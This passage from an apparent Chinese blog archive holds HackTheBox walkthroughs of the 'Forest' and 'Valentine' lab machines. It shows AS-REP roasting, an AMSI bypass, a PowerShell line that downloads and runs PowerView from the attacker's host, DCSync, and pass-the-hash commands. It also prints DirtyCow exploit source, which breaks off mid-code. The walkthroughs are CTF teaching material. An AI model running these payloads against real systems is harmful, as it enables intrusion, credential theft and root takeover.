<p>上面信息收集时发现了ldap服务，那我们尝试使用ldapsearch工具对<code>namingcontexts</code>字段进行发掘<br><img src="https://img-blog.csdnimg.cn/5159dbdc249c4274ba73c56d802ba67c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们尝试更深入地挖掘DN信息，并尝试获取域中的用户列表<br><img src="https://img-blog.csdnimg.cn/412eb99806c84827a8d4924b17aab912.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们还可以使用<code>enum4linux</code>获取用户<br><img src="https://img-blog.csdnimg.cn/295e9874f8a94b21b77a12fd68e7de09.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们将搜集的信息保存为一个<code>anon_ldap.txt</code>文件，过滤出<code>svc-alfresco</code>用户的信息<br><img src="https://img-blog.csdnimg.cn/323186c2631f445e8f56396ebc761eef.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那我们拿到账号和用户名后，我们得检查一下是否启用了预认证，这里解释一下什么是预认证</p>
<blockquote>
<p><strong>在请求 TGT（票证授予票证）时，第一步，请求方（用户）使用自己的 NTLM 哈希加密时间戳，并将其发送到 KDC（密钥分发中心），即域控制器。现在，如果 KDC 使用请求用户的 NTLM 哈希成功解密时间戳，KDC 将知道请求用户是有效用户。<br>可以禁用此检查（这不是默认情况）。在这种情况下，KDC 不会验证请求 TGT 的用户是否有效，而是将 TGT 发送回请求者。<br>该 TGT 包含使用请求用户的 NTLM 哈希加密的部分数据，这意味着我们可以将哈希脱机并尝试破解它。</strong></p>
</blockquote>
<p>那我们可以使用<code>impacket</code>包中的<code>GetNPUsers.py</code>这个脚本去请求TGT，直接获取易受攻击的用户名及对应的哈希值<br><img src="https://img-blog.csdnimg.cn/5284eb6938a448ed9fc2c450536c9ebc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们使用<code>john</code>来破解这个hash值，破解的明文值为<code>s3rvice</code><br><img src="https://img-blog.csdnimg.cn/171d16fb086e4306aed46bcfde8464e3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们也可以用hashcat来破解</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 -a 0 -w 3 forest.hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/ac55b719cfc140b1ada3ab3f1ec23de1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>因为上边我们扫描到主机开放了5985端口，那证明主机开放了WinRM服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.161 -u <span class="string">&#x27;svc-alfresco&#x27;</span> -p <span class="string">&#x27;s3rvice&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/391c73ad0f65465dbec84f80162fe866.png" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们使用Bloodhound这个工具查询是否有潜在的提权路径，首先我们得先把客户端<code>SharpHound.exe</code>上传到目标主机上，并运行它<br><img src="https://img-blog.csdnimg.cn/df95f275e38340aba9d52b2aa90c838e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/eaa70b145a0143d790b4d8c629a36d7f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>为了方便我们传输，我们在本机上搭建一个SMB服务器<br><img src="https://img-blog.csdnimg.cn/a6dcecf002764ceb89b526cfc469f895.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们将压缩包复制到本机上<br><img src="https://img-blog.csdnimg.cn/9c2108c5892d4762af178e042896411e.png" alt="在这里插入图片描述"><br>在攻击机上启动bloodhound，并将压缩包拖进bloodhound中<br><img src="https://img-blog.csdnimg.cn/0e1aedb210f74238ba29dd65d3cfb738.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后点击最后一个选项，查看可以进行哈希传递的用户<br><img src="https://img-blog.csdnimg.cn/7d5109e17fd740c08689be66a2ce0c35.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后再点击这个选项<br><img src="https://img-blog.csdnimg.cn/e417b9a4c91442eeb7e5f52dc99ec7be.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/6899426da41d42139be684f6f99e7772.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以看到<code>svc-alfresco</code>这个用户是属于<code>service account</code>这个组的成员，同时它也是<code>Privileged IT Accounts</code>的成员，它也是<code>account operators</code>的成员。它允许该组的成员创建和修改用户并将其添加到不受保护的组<br><img src="https://img-blog.csdnimg.cn/e2cdb6b465b74640a64b7ea297939ce3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那我们现在点击<code>Shortest Paths to High Value Targets</code>，查看去往高权限目标的路径。该用户具有<code>GenericAll</code>的权限和<code>Exchange Windows</code>权限组。在<code>Exchange Windows</code>权限组具有<code>WriteDacl</code>在域的权限。该<code>WriteDacl</code>权限使用户能够向对象添加<code>DACL</code>（自由访问控制列表）。<br><img src="https://img-blog.csdnimg.cn/c6d80a75b47946b2bb2b74041117d941.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>那就意味着：</strong></p>
<p> <strong>1. 我们可以将用户添加到Exchange Windows 权限组。<br> 2. 然后，由于 Exchange 组有WriteDacl权限，我们可以将DCSync权限授予我们创建的用户。</strong></p>
<blockquote>
<p> <strong>DCsync是几个权限的集合体，是域渗透中经常会用到的技术，如果普通用户想具有DCsync权限，可以给对象添加以下三条ACE：<br> DS-Replication-Get-Changes，对应GUID为：1131f6aa-9c07-11d1-f79f-00c04fc2dcd2<br> DS-Replication-Get-Changes-All，对应GUID为：1131f6ad-9c07-11d1-f79f-00c04fc2dcd2<br> DS-Replication-Get-Changes-In-Filtered-Set，对应GUID为：89e95b76-444d-4c62-991a-0facbeda640c</strong></p>
</blockquote>
<h2 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h2><p>首先我们先将用户添加到域中<br><img src="https://img-blog.csdnimg.cn/412def70d225418188f892346169b474.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们将用户添加到<code>Exchange Windows</code>权限组<br><img src="https://img-blog.csdnimg.cn/ead54544e07d4f67bcb1f4d5c4c973d0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们看看菜单，我们选择<code>Bypass-4MSI</code>，<code>Bypass-4MSI</code>命令用于在导入脚本之前规避防御者。接下来，我们可以使用<code>Add-ObjectACL</code>和<code>john</code>的凭证，并给他<code>DCSync</code>权限。<br><img src="https://img-blog.csdnimg.cn/84b58436b0f54790bfdc7e1e5823e29a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后输入以下的powershell的代码</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\Documents&gt; <span class="built_in">IEX</span>(<span class="built_in">New-Object</span> Net.WebClient).downloadString(<span class="string">&#x27;http://10.10.14.11/PowerView.ps1&#x27;</span>)</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\Documents&gt; <span class="variable">$Secpassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;password1234&#x27;</span> <span class="literal">-asplaintext</span> <span class="literal">-force</span></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\Documents&gt; <span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&#x27;HTB\pyh&#x27;</span>,<span class="variable">$Secpassword</span>)</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\svc<span class="literal">-alfresco</span>\Documents&gt; <span class="built_in">Add-ObjectAcl</span> <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;DC=htb,DC=local&quot;</span> <span class="literal">-PrincipalIdentity</span> pyh <span class="literal">-Rights</span> DCSync</span><br></pre></td></tr></table></figure>
<p>开启一个小型服务器<br><img src="https://img-blog.csdnimg.cn/37f75053912d4977b8ec82cc263da07f.png" alt="在这里插入图片描述"><br>执行完成后，我们使用<code>secretdumps.py</code>脚本获取用户名对应的哈希值。这里我们获取到了管理员的哈希值<br><img src="https://img-blog.csdnimg.cn/16f9219409ec4fa78100ba391a0cf942.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那么我们只需要使用<code>psexec.py</code>脚本来进行哈希传递攻击，获取到超级管理员权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/87f2253887984b2f8852806cd45909bb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Valentine</title>
    <url>/2021/12/24/Valentine/</url>
    <content><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><p><img src="https://img-blog.csdnimg.cn/48b5e5c02ff845d5b280499511915293.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>可以看到主机开放了web服务和ssh服务，这里发现了<code>valentine.htb</code>这个子域，我们可以将它对应的解析地址添加到hosts文件中去<br><img src="https://img-blog.csdnimg.cn/a1a3512aec184664808f7b0dfdab121b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>访问其web服务的时候，就只有一张图片，查看代码源码啥的都没有，但是这张图片的心脏在滴血，我们不难猜到是心脏滴血漏洞吧<br><img src="https://img-blog.csdnimg.cn/d9abb29e5cc84619b8c2c6942db20ce4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那么我们想用脚本检测一下是否存在心脏滴血漏洞，这里有两种方法检测这个漏洞，一种是使用<code>heartbleed.py</code>这个python脚本，另一种是使用nmap自带的nse脚本检测<br><img src="https://img-blog.csdnimg.cn/59444c0ee5d544d298302502fd349bb4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/49fbb69ace90495f904853d28bb58c96.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>我们发现了一段base64的加密信息<code>$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==</code>，解码发现明文是<code>heartbleedbelievethehype</code>，不知道是什么，先留着或许后面有用。<br><img src="https://img-blog.csdnimg.cn/c2499b79b1d24bf5b41b4827e80eab52.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>目前来说没啥可利用的信息了，我们进行扫一波目录吧。发现了三个可访问的目录<br><img src="https://img-blog.csdnimg.cn/921fb947413e49f9835045472777f608.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>dev目录下，我们发现了一个<code>hype_key</code>和<code>notes.txt</code>这两个文件<br><img src="https://img-blog.csdnimg.cn/aca3b9d5338b426880717055af939c05.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>打开hype_key发现是一堆十六进制的字符，我们解码之后发现是一个私钥<br><img src="https://img-blog.csdnimg.cn/ca8014a8611e4285a8dcc55497aee1f6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="https://img-blog.csdnimg.cn/b2d08002b1724754a58cebb6117ef1b6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们发现之前不是有一个类似密码的字符串的吗。我们尝试登陆，并且成功了，我们可以查看到user.txt文件内容<br><img src="https://img-blog.csdnimg.cn/2e18c2941c3045edaccc7ebcbcdc2db3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/afb0ff3e8d0145d9bf0d2a26c4608e2b.png" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这里我们开启一个服务器，上传<code>linpeas.sh</code>这个脚本到目标机器上，这个脚本功能非常强大，是专门针对Linux提权的一个脚本工具。它是由Carlos P创建的，目的是列举在Linux系统上提升特权的所有可能方法。<br><img src="https://img-blog.csdnimg.cn/d6d15cb2cccf4a7fa46092fd5a3db58e.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/06085062db3d40459a5ecef0a53d7a13.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>赋予执行权限并运行这个脚本，这里有两种提权的方法，一种是脏牛提权，这个简单快捷；另一种利用<code>tmux</code>这个应用程序来实施提权。</p>
<h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><p>这里我们发现这个Linux版本较低，那么我们可以使用脏牛进行提权<br><img src="https://img-blog.csdnimg.cn/d06348beabfc4b279891a1cfc60a32a1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在<code>exploit-db</code>上可以发现利用的脚本<br><img src="https://img-blog.csdnimg.cn/4e45a7c7bc434452b0dbe78a15ff87c1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这是整个脚本的内容</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This exploit uses the pokemon exploit of the dirtycow vulnerability</span></span><br><span class="line"><span class="comment">// as a base and automatically generates a new passwd line.</span></span><br><span class="line"><span class="comment">// The user will be prompted for the new password when the binary is run.</span></span><br><span class="line"><span class="comment">// The original /etc/passwd file is then backed up to /tmp/passwd.bak</span></span><br><span class="line"><span class="comment">// and overwrites the root account with the generated line.</span></span><br><span class="line"><span class="comment">// After running the exploit you should be able to login with the newly</span></span><br><span class="line"><span class="comment">// created user.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// To use this exploit modify the user values according to your needs.</span></span><br><span class="line"><span class="comment">//   The default is &quot;firefart&quot;.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Original exploit (dirtycow&#x27;s ptrace_pokedata &quot;pokemon&quot; method):</span></span><br><span class="line"><span class="comment">//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Compile with:</span></span><br><span class="line"><span class="comment">//   gcc -pthread dirty.c -o dirty -lcrypt</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Then run the newly create binary by either doing:</span></span><br><span class="line"><span class="comment">//   &quot;./dirty&quot; or &quot;./dirty my-new-password&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// DON&#x27;T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!</span></span><br><span class="line"><span class="comment">//   mv /tmp/passwd.bak /etc/passwd</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer</span></span><br><span class="line"><span class="comment">// https://firefart.at</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;crypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *filename = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *backup_filename = <span class="string">&quot;/tmp/passwd.bak&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *salt = <span class="string">&quot;firefart&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> f;</span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">pthread_t</span> pth;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> &#123;</span></span><br><span class="line">   <span class="keyword">char</span> *username;</span><br><span class="line">   <span class="keyword">char</span> *hash;</span><br><span class="line">   <span class="keyword">int</span> user_id;</span><br><span class="line">   <span class="keyword">int</span> group_id;</span><br><span class="line">   <span class="keyword">char</span> *info;</span><br><span class="line">   <span class="keyword">char</span> *home_dir;</span><br><span class="line">   <span class="keyword">char</span> *shell;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">generate_password_hash</span><span class="params">(<span class="keyword">char</span> *plaintext_pw)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypt(plaintext_pw, salt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">generate_passwd_line</span><span class="params">(struct Userinfo u)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *format = <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>;</span><br><span class="line">  <span class="keyword">int</span> size = <span class="built_in">snprintf</span>(<span class="literal">NULL</span>, <span class="number">0</span>, format, u.username, u.hash,</span><br><span class="line">    u.user_id, u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  <span class="keyword">char</span> *ret = <span class="built_in">malloc</span>(size + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(ret, format, u.username, u.hash, u.user_id,</span><br><span class="line">    u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i, c = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">200000000</span>; i++) &#123;</span><br><span class="line">    c += madvise(<span class="built_in">map</span>, <span class="number">100</span>, MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n\n&quot;</span>, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *from, <span class="keyword">const</span> <span class="keyword">char</span> *to)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// check if target file already exists</span></span><br><span class="line">  <span class="keyword">if</span>(access(to, F_OK) != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;File %s already exists! Please delete it and run again\n&quot;</span>,</span><br><span class="line">      to);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> ch;</span><br><span class="line">  FILE *source, *target;</span><br><span class="line"></span><br><span class="line">  source = fopen(from, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(source == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  target = fopen(to, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(target == <span class="literal">NULL</span>) &#123;</span><br><span class="line">     fclose(source);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>((ch = fgetc(source)) != EOF) &#123;</span><br><span class="line">     fputc(ch, target);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s successfully backed up to %s\n&quot;</span>,</span><br><span class="line">    from, to);</span><br><span class="line"></span><br><span class="line">  fclose(source);</span><br><span class="line">  fclose(target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// backup file</span></span><br><span class="line">  <span class="keyword">int</span> ret = copy_file(filename, backup_filename);</span><br><span class="line">  <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(ret);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> <span class="title">user</span>;</span></span><br><span class="line">  <span class="comment">// set values, change as needed</span></span><br><span class="line">  user.username = <span class="string">&quot;firefart&quot;</span>;</span><br><span class="line">  user.user_id = <span class="number">0</span>;</span><br><span class="line">  user.group_id = <span class="number">0</span>;</span><br><span class="line">  user.info = <span class="string">&quot;pwned&quot;</span>;</span><br><span class="line">  user.home_dir = <span class="string">&quot;/root&quot;</span>;</span><br><span class="line">  user.shell = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *plaintext_pw;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &gt;= <span class="number">2</span>) 